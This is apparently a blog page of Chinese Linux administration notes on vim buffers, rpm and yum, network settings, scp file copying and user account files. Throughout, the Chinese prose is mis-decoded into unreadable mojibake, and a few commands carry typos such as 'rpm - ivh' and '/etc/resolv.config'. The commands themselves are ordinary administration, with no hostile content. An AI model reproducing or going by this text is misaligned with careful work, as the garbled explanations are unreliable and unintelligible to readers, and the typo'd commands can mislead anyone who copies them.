<p>:n     ç¼–è¾‘ä¸‹ä¸€ä¸ªæ–‡æ¡£ã€‚<br>:2n    ç¼–è¾‘ä¸‹ä¸¤ä¸ªæ–‡æ¡£ã€‚<br>:N     ç¼–è¾‘ä¸Šä¸€ä¸ªæ–‡æ¡£ã€‚æ³¨æ„ï¼Œè¯¥æ–¹æ³•åªèƒ½ç”¨äºåŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡æ¡£ã€‚<br>:e æ–‡æ¡£å    è¿™æ˜¯åœ¨è¿›å…¥vimåï¼Œä¸ç¦»å¼€ vim çš„æƒ…å½¢ä¸‹æ‰“å¼€å…¶ä»–æ–‡æ¡£ã€‚<br>:e# æˆ– Ctrl+Ë†   ç¼–è¾‘ä¸Šä¸€ä¸ªæ–‡æ¡£,ç”¨äºä¸¤ä¸ªæ–‡æ¡£ç›¸äº’äº¤æ¢ç¼–è¾‘æ—¶ä½¿ç”¨ã€‚?# ä»£è¡¨çš„æ˜¯ç¼–è¾‘å‰ä¸€æ¬¡ç¼–è¾‘çš„æ–‡æ¡£<br>:files æˆ– :buffers æˆ– :ls   å¯ä»¥åˆ—å‡ºç›®å‰ ç¼“å†²åŒº ä¸­çš„æ‰€æœ‰æ–‡æ¡£ã€‚åŠ å· + è¡¨ç¤º ç¼“å†²åŒºå·²ç»è¢«ä¿®æ”¹è¿‡äº†ã€‚ï¼ƒä»£è¡¨ä¸Šä¸€æ¬¡ç¼–è¾‘çš„æ–‡æ¡£ï¼Œ%æ˜¯ç›®å‰æ­£åœ¨ç¼–è¾‘ä¸­çš„æ–‡æ¡£<br>:b æ–‡æ¡£åæˆ–ç¼–å·   ç§»è‡³è¯¥æ–‡æ¡£ã€‚<br>:f æˆ– Ctrl+g   æ˜¾ç¤ºå½“å‰æ­£åœ¨ç¼–è¾‘çš„æ–‡æ¡£åç§°ã€‚<br>:f æª”å     æ”¹å˜ç¼–è¾‘ä¸­çš„æ–‡æ¡£åã€‚(file)</p>
<p> <strong>å¤šæ–‡ä»¶åˆ‡æ¢</strong></p>
<ol>
<li>é€šè¿‡vimæ‰“å¼€å¤šä¸ªæ–‡ä»¶ï¼ˆå¯ä»¥é€šè¿‡ctagsæˆ–è€…cscopeï¼‰ </li>
<li>â€œ:lsâ€æŸ¥çœ‹å½“å‰æ‰“å¼€çš„bufferï¼ˆæ–‡ä»¶ï¼‰ </li>
<li>â€œ:b numâ€åˆ‡æ¢æ–‡ä»¶ï¼ˆå…¶ä¸­numä¸ºbuffer listä¸­çš„ç¼–å·ï¼‰</li>
</ol>
</li>
</ul>
<hr>
<h3 id="æ‰‹å·¥rpmåŒ…ç®¡ç†"><a href="#æ‰‹å·¥rpmåŒ…ç®¡ç†" class="headerlink" title="æ‰‹å·¥rpmåŒ…ç®¡ç†"></a>æ‰‹å·¥rpmåŒ…ç®¡ç†</h3><p>æºç åŒ…ï¼ˆè„šæœ¬å®‰è£…åŒ…ï¼‰</p>
<p>rpmåŒ…æ˜¯centosä¸­çš„å®‰è£…åŒ…ï¼Œæ˜¯äºŒè¿›åˆ¶åŒ…ï¼Œå·²ç»è¿‡ç¼–è¯‘çš„åŒ…</p>
<h4 id="rpmåŒ…ç®¡ç†å‘½åå’Œä¾èµ–æ€§"><a href="#rpmåŒ…ç®¡ç†å‘½åå’Œä¾èµ–æ€§" class="headerlink" title="rpmåŒ…ç®¡ç†å‘½åå’Œä¾èµ–æ€§"></a>rpmåŒ…ç®¡ç†å‘½åå’Œä¾èµ–æ€§</h4><ul>
<li><p>httpd-2.2.15-15.el6.centos.1.i686.rpmï¼ˆä¾‹å­ï¼ŒåŒ…å…¨åï¼‰</p>
<p>â€‹    httpd    è½¯ä»¶åŒ…å</p>
<p>â€‹    2.2.15   è½¯ä»¶ç‰ˆæœ¬</p>
<p>â€‹    15          è½¯ä»¶å‘å¸ƒæ¬¡æ•°</p>
<p>â€‹    el6.centos é€‚åˆçš„Linuxå¹³å°</p>
<p>â€‹    i686        é€‚åˆçš„ç¡¬ä»¶å¹³å°</p>
<p>â€‹    rpm         rpmåŒ…æ‰©å±•å</p>
</li>
<li><p>ä¾èµ–æ€§</p>
<ul>
<li>æ ‘å½¢ä¾èµ–ï¼š a-&gt;b-&gt;c</li>
<li>ç¯å½¢ä¾èµ–:    a-&gt;b-&gt;c-&gt;a</li>
<li>æ¨¡å—ä¾èµ–ï¼šæ¨¡å—ä¾èµ–æŸ¥è¯¢ç½‘ç«™</li>
</ul>
<p><a href="http://www.rpmfind.net/">www.rpmfind.net</a></p>
<p>.so.2æ˜¯åº“ä¾èµ–</p>
</li>
<li><p>yumåœ¨çº¿ç®¡ç†</p>
</li>
</ul>
<p>yumå¯ä»¥ä»äº’è”ç½‘ä¸Šè‡ªåŠ¨ä¸‹è½½ä¾èµ–åº“ï¼Œè§£å†³rpmå‘½ä»¤ç®¡ç†çš„ä¾èµ–æ€§é—®é¢˜ï¼ˆä¸‹ä¸€è®²ï¼‰</p>
<h4 id="å®‰è£…å‡çº§ä¸å¸è½½"><a href="#å®‰è£…å‡çº§ä¸å¸è½½" class="headerlink" title="å®‰è£…å‡çº§ä¸å¸è½½"></a>å®‰è£…å‡çº§ä¸å¸è½½</h4><p>åŒ…å…¨åï¼šæ“ä½œçš„åŒ…æ˜¯æ²¡æœ‰å®‰è£…çš„è½¯ä»¶åŒ…æ—¶ï¼Œä½¿ç”¨åŒ…å…¨å</p>
<p>åŒ…åï¼šæ“ä½œå·²ç»å®‰è£…çš„è½¯ä»¶åŒ…æ—¶ï¼Œä½¿ç”¨åŒ…åï¼Œæœç´¢/var/lib/rpm/ä¸­çš„æ•°æ®åº“</p>
<ul>
<li>å®‰è£…</li>
</ul>
<p>rpm - ivh  åŒ…å…¨å</p>
<p>-i   ï¼ˆinstallï¼‰ å®‰è£…</p>
<p>-v (verbose)   æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</p>
<p>-h (hash)    æ˜¾ç¤ºè¿›åº¦</p>
<p>â€“nodeps  ä¸æ£€æµ‹ä¾èµ–æ€§ï¼ˆä¸€èˆ¬ä¸ç”¨ï¼‰</p>
<p><em><strong>psï¼šä¸¤æ¬¡tabé”®è¡¥å…¨</strong></em></p>
<ul>
<li><p>å‡çº§</p>
<p>rpm -Uvh åŒ…å…¨å</p>
<p>upgrade</p>
</li>
<li><p>å¸è½½</p>
</li>
</ul>
<p>rpm -e åŒ…å</p>
<p>erase</p>
<h4 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h4><p>rpm  åŒ…å</p>
<p>-q query æŸ¥å·²å®‰è£…åŒ…ï¼ŒåŒ…å</p>
<p>-a all</p>
<p>-i information</p>
<p>-p package  æŸ¥è¯¢æœªå®‰è£…åŒ…çš„ä¿¡æ¯ï¼ŒåŒ…å…¨å</p>
<p>-l list åˆ—è¡¨</p>
<p>-f file</p>
<hr>
<p>-qlå¯ä»¥æŸ¥è¯¢å®‰è£…ä½ç½®</p>
<p>-qi åŒ…å æŸ¥è¯¢è½¯ä»¶åŒ…çš„è¯¦ç»†ä¿¡æ¯</p>
<p>-qf ç³»ç»Ÿæ–‡ä»¶å</p>
<p>-qR åŒ…å   æŸ¥è¯¢æœªå®‰è£…çš„æœåŠ¡ä¾èµ–æ€§</p>
<h4 id="æ•ˆéªŒ"><a href="#æ•ˆéªŒ" class="headerlink" title="æ•ˆéªŒ"></a>æ•ˆéªŒ</h4><p>-V å·²å®‰è£…çš„åŒ…å</p>
<p>éªŒè¯å†…å®¹ä¸­å…«ä¸ªä¿¡æ¯å…·ä½“å†…å®¹å¦‚ä¸‹</p>
<p>S  æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜</p>
<p>M  æ–‡ä»¶çš„ç±»å‹å’Œæ–‡ä»¶æƒé™æ˜¯å¦æ”¹å˜</p>
<p>5  æ–‡ä»¶md5æ ¡éªŒå’Œæ˜¯å¦è¢«æ”¹å˜</p>
<p>D   è®¾å¤‡ä¸­çš„ä¸»ä»ä»£ç æ˜¯å¦æ”¹å˜</p>
<p>L  æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜</p>
<p>U   æ–‡ä»¶çš„æ‰€æœ‰è€…å…³ç³»æ˜¯å¦æ”¹å˜</p>
<p>G  æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜</p>
<p>T  æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜</p>
<hr>
<p>c  é…ç½®æ–‡ä»¶config</p>
<p>d æ™®é€šæ–‡æ¡£documentation</p>
<p>g ghostæ–‡ä»¶ä¸åº”è¢«rpmåŒ…åŒ…å«</p>
<p>l æˆæƒæ–‡ä»¶license</p>
<p>r æè¿°æ–‡ä»¶readme</p>
<ul>
<li>rpmåŒ…ä¸­æ–‡ä»¶æå–ï¼ˆå¯ä»¥ç”¨äºæ¢å¤ç³»ç»Ÿæ–‡ä»¶è¯¯åˆ ï¼‰</li>
</ul>
<p>rpm2cpio åŒ…å…¨å | \ cpio -idv .æ–‡ä»¶ç»å¯¹è·¯å¾„</p>
<p>#rpm2cpioæ˜¯ä¸€ä¸ªæŠŠrpmåŒ…è½¬æ¢æˆcpioæ ¼å¼çš„å‘½ä»¤</p>
<p>#cpioæ˜¯ä¸€ä¸ªæ ‡å‡†å·¥å…·ï¼Œç”¨äºåˆ›å»ºè½¯ä»¶æ¡£æ¡ˆæ–‡ä»¶å’Œä»æ¡£æ¡ˆæ–‡ä»¶ä¸­æå–æ–‡ä»¶</p>
<hr>
<h3 id="åœ¨çº¿rpmåŒ…ç®¡ç†"><a href="#åœ¨çº¿rpmåŒ…ç®¡ç†" class="headerlink" title="åœ¨çº¿rpmåŒ…ç®¡ç†"></a>åœ¨çº¿rpmåŒ…ç®¡ç†</h3><h4 id="IPåœ°å€é…ç½®å’Œç½‘ç»œyumæº"><a href="#IPåœ°å€é…ç½®å’Œç½‘ç»œyumæº" class="headerlink" title="IPåœ°å€é…ç½®å’Œç½‘ç»œyumæº"></a>IPåœ°å€é…ç½®å’Œç½‘ç»œyumæº</h4><ul>
<li><p>ipåœ°å€å’Œæœ¬æœºç½‘ç»œä¿¡æ¯</p>
<ol>
<li><p> setupå›è½¦å°±å¯ä»¥é…ç½®ipåœ°å€ï¼ˆä»…redhatç³»åˆ—ï¼‰</p>
</li>
<li><p>æ”¹ipåœ°å€: vi /etc/sysconfig/network-scripts/ifcfg-eth0ä¸­onbootæ”¹æˆyes ç„¶å service network restart</p>
</li>
<li><p>æ”¹ä¸»æœºå:/etc/sysconfig/network</p>
</li>
<li><p>æ”¹dns: /etc/resolv.conf</p>
</li>
</ol>
</li>
<li><p>ç½‘ç»œyumæº</p>
</li>
</ul>
<p>vi /etc/yum.repos.d/CentOS-Base.repo </p>
<h4 id="yumå‘½ä»¤"><a href="#yumå‘½ä»¤" class="headerlink" title="yumå‘½ä»¤"></a>yumå‘½ä»¤</h4><p>yum list   æŸ¥è¯¢æ‰€æœ‰å¯ç”¨è½¯ä»¶åŒ…åˆ—è¡¨</p>
<p>yum search å…³é”®å­—  æœç´¢æœåŠ¡å™¨ä¸Šæ‰€æœ‰å’Œå…³é”®å­—ç›¸å…³çš„åŒ…</p>
<p>yum -y install åŒ…å    å®‰è£…</p>
<p>yum - y  update åŒ…å   å‡çº§ï¼ˆä¸åŠ åŒ…åä¼šå‡çº§æ‰€æœ‰è½¯ä»¶åŒ…æ‹¬å†…æ ¸ï¼Œä¼šå¯¼è‡´è¿œç¨‹å†…æ ¸è¿æ¥ä¸ä¸Šï¼‰</p>
<p>yum -y remove åŒ…å   å¸è½½ï¼ˆå°½é‡ä¸è¦å¸è½½ï¼Œä¼šå¸è½½æ‰€æœ‰ä¾èµ–åº“ï¼Œå¯èƒ½ä¼šå¯¼è‡´Linuxå´©æºƒï¼‰</p>
<ul>
<li>è½¯ä»¶åŒ…ç»„å®‰è£…</li>
</ul>
<p>yum grouplist  åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„è½¯ä»¶ç»„åˆ—è¡¨</p>
<p>yum groupinstall è½¯ä»¶ç»„å    æŒ‡å®šå®‰è£…è½¯ä»¶ç»„</p>
<p>yum groupremove  è½¯ä»¶ç»„å   å¸è½½æŒ‡å®šè½¯ä»¶ç»„</p>
<hr>
<h4 id="å…‰ç›˜yumçš„æ­å»º"><a href="#å…‰ç›˜yumçš„æ­å»º" class="headerlink" title="å…‰ç›˜yumçš„æ­å»º"></a>å…‰ç›˜yumçš„æ­å»º</h4><ol>
<li><p>æŒ‚è½½å…‰ç›˜</p>
</li>
<li><p>è®©ç½‘ç»œyumæºæ–‡ä»¶å¤±æ•ˆï¼Œé€šè¿‡æ”¹/etc/yum.repos.d/ä¸­é™¤äº†å…‰ç›˜çš„repoæ–‡ä»¶ä¹‹å¤–çš„repoæ–‡ä»¶çš„æ–‡ä»¶åæ¥ä½¿å…¶å¤±æ•ˆ</p>
</li>
<li><p>åœ¨ä¿®æ”¹å…‰ç›˜yumæºæ–‡ä»¶</p>
<p>fileåœ°å€æ”¹ä¸ºè‡ªå·±çš„å…‰ç›˜åœ°å€ï¼Œenable = 1ï¼›æ‰“å¼€ </p>
<h3 id="æºç åŒ…-amp-rpmåŒ…"><a href="#æºç åŒ…-amp-rpmåŒ…" class="headerlink" title="æºç åŒ…&amp;rpmåŒ…"></a>æºç åŒ…&amp;rpmåŒ…</h3><ol>
<li><p>ä¸‹è½½æºç åŒ…</p>
</li>
<li><p>è§£å‹ç¼©ä¸‹è½½çš„æºç åŒ…</p>
</li>
<li><p>è¿›å…¥è§£å‹ç¼©ç›®å½•</p>
<p>lsæŸ¥çœ‹INSTALLæ–‡ä»¶å’ŒREADMEæ–‡ä»¶å¯ä»¥æä¾›å®‰è£…å¸®åŠ©</p>
</li>
</ol>
</li>
</ol>
<ul>
<li><p>æºç åŒ…ä¸€èˆ¬å®‰è£…åœ¨/usr/local/è½¯ä»¶å/</p>
</li>
<li><p>etc/rc.d/init.d/  ä¸­æœ‰å¯æ‰§è¡Œæ–‡ä»¶</p>
<p>service æœåŠ¡å start/restart</p>
<p>  serviceä¸èƒ½ç®¡ç†æºç åŒ…</p>
<p>æºç åŒ…åœ¨ usr/local/src/ä¸­</p>
<p>è½¯ä»¶å®‰è£…ä½ç½®/usr/local/ </p>
<p>make ç¼–è¯‘ å¦‚æœå‡ºé”™ make clean</p>
<p>make install ç¼–è¯‘å®‰è£…</p>
</li>
</ul>
<h3 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h3><h4 id="ä¿®æ”¹ip"><a href="#ä¿®æ”¹ip" class="headerlink" title="ä¿®æ”¹ip"></a>ä¿®æ”¹ip</h4><ul>
<li>ä¸´æ—¶ä¿®æ”¹å‘½ä»¤å·¥å…·</li>
</ul>
<p>ifconfig æŸ¥çœ‹ä¸é…ç½®ç½‘ç»œçŠ¶æ€å‘½ä»¤</p>
<p>ä¸´æ—¶è®¾ç½®eth0ç½‘å¡ipåœ°å€å’Œå­ç½‘æ©ç </p>
<p><code>ifconfig eth0 192.168.0.200 255.255.255.0</code></p>
<p>è™šæ‹Ÿç½‘å¡ <code>ifconfig eth0:0 192.168.3.1</code></p>
<p>å…³é—­è™šæ‹Ÿç½‘å¡<code>ifconfig eth0:0 down</code></p>
<ul>
<li>setupå›¾å½¢åŒ–çª—å£é…ç½®</li>
<li>ä¿®æ”¹ç½‘ç»œé…ç½®æ–‡ä»¶</li>
</ul>
<p><code>vi /etc/sysconfig/network-scripts/ifcfg-eth0  </code></p>
<p>ä¸»æœºå<code>vi /etc/sysconfig/network</code></p>
<p>dns <code>vi /etc/resolv.config </code></p>
<p>ä¿®æ”¹å®Œç½‘ç»œä¿¡æ¯éœ€è¦å¯¹ç½‘ç»œæœåŠ¡è¿›è¡Œé‡å¯<code>service network restart</code></p>
<h4 id="æŸ¥çœ‹ä¸»æœºå"><a href="#æŸ¥çœ‹ä¸»æœºå" class="headerlink" title="æŸ¥çœ‹ä¸»æœºå"></a>æŸ¥çœ‹ä¸»æœºå</h4><p><code>hostname</code>æ˜¾ç¤ºä¸»æœºå </p>
<p><code>hostname ä¸»æœºå</code>æ›´æ”¹ä¸»æœºå</p>
<h4 id="ç½‘å¡è®¾å¤‡å¼€å…³"><a href="#ç½‘å¡è®¾å¤‡å¼€å…³" class="headerlink" title="ç½‘å¡è®¾å¤‡å¼€å…³"></a>ç½‘å¡è®¾å¤‡å¼€å…³</h4><p><code>ifdown ç½‘å¡è®¾å¤‡å</code>   ç¦ç”¨ç½‘å¡</p>
<p><code>ifup  ç½‘å¡è®¾å¤‡å</code>  å¼€å¯ç½‘å¡</p>
<h4 id="æŸ¥çœ‹ç½‘ç»œçŠ¶æ€"><a href="#æŸ¥çœ‹ç½‘ç»œçŠ¶æ€" class="headerlink" title="æŸ¥çœ‹ç½‘ç»œçŠ¶æ€"></a>æŸ¥çœ‹ç½‘ç»œçŠ¶æ€</h4><p>netstat [option]</p>
<p>-t   åˆ—å‡ºtcpåè®®ç«¯å£</p>
<p>-u  åˆ—å‡ºudpåè®®ç«¯å£</p>
<p>-a all,åŒ…æ‹¬tcpå’Œudp</p>
<p>-n  ä¸ä½¿ç”¨åŸŸåå’ŒæœåŠ¡å,è€Œä½¿ç”¨ipåœ°å€å’Œç«¯å£å·</p>
<p>-l  ä»…åˆ—å‡ºåœ¨ç›‘å¬çŠ¶æ€çš„ç½‘å¡</p>
<p>-r æŸ¥çœ‹è·¯ç”±åˆ—è¡¨</p>
<p><code>route -n</code>  æŸ¥çœ‹è·¯ç”±åˆ—è¡¨</p>
<h4 id="åŸŸåè§£æå‘½ä»¤"><a href="#åŸŸåè§£æå‘½ä»¤" class="headerlink" title="åŸŸåè§£æå‘½ä»¤"></a>åŸŸåè§£æå‘½ä»¤</h4><p><code>nslookup ä¸»æœºåæˆ–è€…ip</code></p>
<h4 id="pingå‘½ä»¤"><a href="#pingå‘½ä»¤" class="headerlink" title="pingå‘½ä»¤"></a>pingå‘½ä»¤</h4><p><code>ping ä¸»æœºæˆ–è€…ip</code></p>
<p>-c æ¬¡æ•°</p>
<h4 id="telnetå‘½ä»¤"><a href="#telnetå‘½ä»¤" class="headerlink" title="telnetå‘½ä»¤"></a>telnetå‘½ä»¤</h4><p><code>telnet [åŸŸåå’Œip]  [ç«¯å£]</code>  #è¿œç¨‹ç®¡ç†å’Œç«¯å£æ¢æµ‹å‘½ä»¤</p>
<p>æˆ–è€…ç›´æ¥ç”¨nmapæ‰«</p>
<h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p><code>traceroute [option] ipæˆ–è€…åŸŸå</code></p>
<p>è·¯ç”±è·Ÿè¸ªå‘½ä»¤</p>
<p>-n   ä½¿ç”¨ipä¸ä½¿ç”¨åŸŸå,é€Ÿåº¦æ›´å¿«</p>
<h4 id="wgetå‘½ä»¤-ä¸‹è½½"><a href="#wgetå‘½ä»¤-ä¸‹è½½" class="headerlink" title="wgetå‘½ä»¤,ä¸‹è½½"></a>wgetå‘½ä»¤,ä¸‹è½½</h4><p><code>wget ç½‘ç«™</code></p>
<p>ä¸‹è½½å‘½ä»¤</p>
<h4 id="SCPå‘½ä»¤"><a href="#SCPå‘½ä»¤" class="headerlink" title="SCPå‘½ä»¤"></a>SCPå‘½ä»¤</h4><p>scp [å‚æ•°] [åŸè·¯å¾„] [ç›®æ ‡è·¯å¾„]</p>
<ul>
<li><p>å‘½ä»¤å‚æ•°ï¼š</p>
</li>
<li><p>-1 å¼ºåˆ¶scpå‘½ä»¤ä½¿ç”¨åè®®ssh1</p>
</li>
<li><p>-2 å¼ºåˆ¶scpå‘½ä»¤ä½¿ç”¨åè®®ssh2</p>
</li>
<li><p>-4 å¼ºåˆ¶scpå‘½ä»¤åªä½¿ç”¨IPv4å¯»å€</p>
</li>
<li><p>-6 å¼ºåˆ¶scpå‘½ä»¤åªä½¿ç”¨IPv6å¯»å€</p>
</li>
<li><p>-B ä½¿ç”¨æ‰¹å¤„ç†æ¨¡å¼ï¼ˆä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¯¢é—®ä¼ è¾“å£ä»¤æˆ–çŸ­è¯­ï¼‰</p>
</li>
<li><p>-C å…è®¸å‹ç¼©ã€‚ï¼ˆå°†-Cæ ‡å¿—ä¼ é€’ç»™sshï¼Œä»è€Œæ‰“å¼€å‹ç¼©åŠŸèƒ½ï¼‰</p>
</li>
<li><p>-p ç•™åŸæ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œè®¿é—®æ—¶é—´å’Œè®¿é—®æƒé™ã€‚</p>
</li>
<li><p>-q ä¸æ˜¾ç¤ºä¼ è¾“è¿›åº¦æ¡ã€‚</p>
</li>
<li><p>-r é€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•ã€‚</p>
</li>
<li><p>-v è¯¦ç»†æ–¹å¼æ˜¾ç¤ºè¾“å‡ºã€‚scpå’Œssh(1)ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªè¿‡ç¨‹çš„è°ƒè¯•ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯ç”¨äºè°ƒè¯•è¿æ¥ï¼ŒéªŒè¯å’Œé…ç½®é—®é¢˜ã€‚</p>
</li>
<li><p>-c cipher ä»¥cipherå°†æ•°æ®ä¼ è¾“è¿›è¡ŒåŠ å¯†ï¼Œè¿™ä¸ªé€‰é¡¹å°†ç›´æ¥ä¼ é€’ç»™sshã€‚</p>
</li>
<li><p>-F ssh_config æŒ‡å®šä¸€ä¸ªæ›¿ä»£çš„sshé…ç½®æ–‡ä»¶ï¼Œæ­¤å‚æ•°ç›´æ¥ä¼ é€’ç»™sshã€‚</p>
</li>
<li><p>-i identity_file ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–ä¼ è¾“æ—¶ä½¿ç”¨çš„å¯†é’¥æ–‡ä»¶ï¼Œæ­¤å‚æ•°ç›´æ¥ä¼ é€’ç»™sshã€‚</p>
</li>
<li><p>-l limit é™å®šç”¨æˆ·æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œä»¥Kbit/sä¸ºå•ä½ã€‚</p>
</li>
<li><p>-o ssh_option å¦‚æœä¹ æƒ¯äºä½¿ç”¨ssh_config(5)ä¸­çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Œ</p>
</li>
<li><p>-P port æ³¨æ„æ˜¯å¤§å†™çš„P, portæ˜¯æŒ‡å®šæ•°æ®ä¼ è¾“ç”¨åˆ°çš„ç«¯å£å·</p>
</li>
<li><p>-S program æŒ‡å®šåŠ å¯†ä¼ è¾“æ—¶æ‰€ä½¿ç”¨çš„ç¨‹åºã€‚æ­¤ç¨‹åºå¿…é¡»èƒ½å¤Ÿç†è§£ssh(1)çš„é€‰é¡¹ã€‚</p>
</li>
</ul>
<ul>
<li>ä»æœ¬åœ°æœåŠ¡å™¨å¤åˆ¶åˆ°è¿œç¨‹æœåŠ¡å™¨</li>
</ul>
<p>å¤åˆ¶æ–‡ä»¶:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp local_file remote_username@remote_ip:remote_folder</span><br><span class="line">$scp local_file remote_username@remote_ip:remote_file</span><br><span class="line">$scp local_file remote_ip:remote_folder</span><br><span class="line">$scp local_file remote_ip:remote_file</span><br></pre></td></tr></table></figure>

<p>æŒ‡å®šäº†ç”¨æˆ·åï¼Œå‘½ä»¤æ‰§è¡Œåéœ€è¦è¾“å…¥ç”¨æˆ·å¯†ç ï¼›å¦‚æœä¸æŒ‡å®šç”¨æˆ·åï¼Œå‘½ä»¤æ‰§è¡Œåéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼›</p>
<p>å¤åˆ¶ç›®å½•:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r local_folder remote_username@remote_ip:remote_folder</span><br><span class="line">$scp -r local_folder remote_ip:remote_folder</span><br></pre></td></tr></table></figure>

<p>ç¬¬1ä¸ªæŒ‡å®šäº†ç”¨æˆ·åï¼Œå‘½ä»¤æ‰§è¡Œåéœ€è¦è¾“å…¥ç”¨æˆ·å¯†ç ï¼› ç¬¬2ä¸ªæ²¡æœ‰æŒ‡å®šç”¨æˆ·åï¼Œå‘½ä»¤æ‰§è¡Œåéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼›</p>
<p>æ³¨è§£</p>
<p>ä»è¿œç¨‹å¤åˆ¶åˆ°æœ¬åœ°çš„scpå‘½ä»¤ä¸ä¸Šé¢çš„å‘½ä»¤ä¸€æ ·ï¼Œåªè¦å°†ä»æœ¬åœ°å¤åˆ¶åˆ°è¿œç¨‹çš„å‘½ä»¤åé¢2ä¸ªå‚æ•°äº’æ¢é¡ºåºå°±è¡Œäº†ã€‚</p>
<ul>
<li>å®ä¾‹1ï¼šä»è¿œå¤„å¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°ç›®å½•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š ä»10.6.159.147æœºå™¨ä¸Šçš„/opt/soft/çš„ç›®å½•ä¸­ä¸‹è½½demo.tar æ–‡ä»¶åˆ°æœ¬åœ°/opt/soft/ç›®å½•ä¸­</p>
<ul>
<li>å®ä¾‹2ï¼šä»è¿œå¤„å¤åˆ¶åˆ°æœ¬åœ°</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r root@10.6.159.147:/opt/soft/test /opt/soft/</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š ä»10.6.159.147æœºå™¨ä¸Šçš„/opt/soft/ä¸­ä¸‹è½½testç›®å½•åˆ°æœ¬åœ°çš„/opt/soft/ç›®å½•æ¥ã€‚</p>
<ul>
<li>å®ä¾‹3ï¼šä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°è¿œç¨‹æœºå™¨æŒ‡å®šç›®å½•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š å¤åˆ¶æœ¬åœ°opt/soft/ç›®å½•ä¸‹çš„æ–‡ä»¶demo.tar åˆ°è¿œç¨‹æœºå™¨10.6.159.147çš„opt/soft/scptestç›®å½•</p>
<ul>
<li>å®ä¾‹4ï¼šä¸Šä¼ æœ¬åœ°ç›®å½•åˆ°è¿œç¨‹æœºå™¨æŒ‡å®šç›®å½•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š ä¸Šä¼ æœ¬åœ°ç›®å½• /opt/soft/teståˆ°è¿œç¨‹æœºå™¨10.6.159.147ä¸Š/opt/soft/scptestçš„ç›®å½•ä¸­</p>
<h2 id="ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†"><a href="#ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†" class="headerlink" title="ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†"></a>ç”¨æˆ·å’Œç”¨æˆ·ç»„ç®¡ç†</h2><p><strong>ç”¨æˆ·åŸºæœ¬ä¿¡æ¯æ–‡ä»¶</strong>              /etc/passwd</p>
<p><code>account:password:uid:gid:ç”¨æˆ·è¯´æ˜:å®¶ç›®å½•:shellè§£é‡Šå™¨æ‰€åœ¨ä½ç½®</code></p>
<ul>
<li>shellè§£é‡Šå™¨çš„ä½ç½®/bin/bashè¯´æ˜æ˜¯å…è®¸ç™»å½•çš„,ä½†æ˜¯/sbin/nologinå°±ä¸èƒ½ç™»å½•</li>
<li>åˆå§‹ç»„å’Œé™„åŠ ç»„,åˆå§‹ç»„çš„åªèƒ½æœ‰ä¸€ä¸ª,å¯ä»¥æ”¹ä½†ä¸å»ºè®®,ä¸€ä¸ªç”¨æˆ·å¯ä»¥ç”¨å¤šä¸ªé™„åŠ ç»„</li>
<li>uidä¸º0æ—¶æ˜¯ç®¡ç†å‘˜ç”¨æˆ·</li>
<li>passwdå­—æ®µæ˜¯xçš„æ„æ€æ˜¯çœŸå®å¯†ç (åŠ å¯†åå¯†ç )å­˜åœ¨/etc/shadowæ–‡ä»¶ä¸‹ ,å…·ä½“å«ä¹‰man 5 shadow</li>
</ul>
<p><strong>ç»„ä¿¡æ¯æ–‡ä»¶</strong>                             /etc/group</p>
<p><code>ç»„å:password:gid:è¿™ä¸ªç»„ä¸­çš„é™„åŠ ç”¨æˆ·</code></p>
<ul>
<li>passwordçœŸå®åŠ å¯†å¯†ç åœ¨gshadowä¸­</li>
</ul>
<p><strong>å®¶ç›®å½•</strong>       æ™®é€šç”¨æˆ·: /home/ç”¨æˆ·å/      rootç”¨æˆ·: /root/</p>
<p><strong>ç”¨æˆ·é‚®ç®±</strong> /var/spool/mail/ç”¨æˆ·å/</p>
<p><strong>ç”¨æˆ·æ¨¡æ¿ç›®å½•</strong>    /etc/skel/  åœ¨æ–°å»ºç”¨æˆ·æ—¶è‡ªåŠ¨æ‹·è´è¯¥æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰å†…å®¹åˆ°æ–°å»ºç”¨æˆ·çš„å®¶ç›®å½•</p>
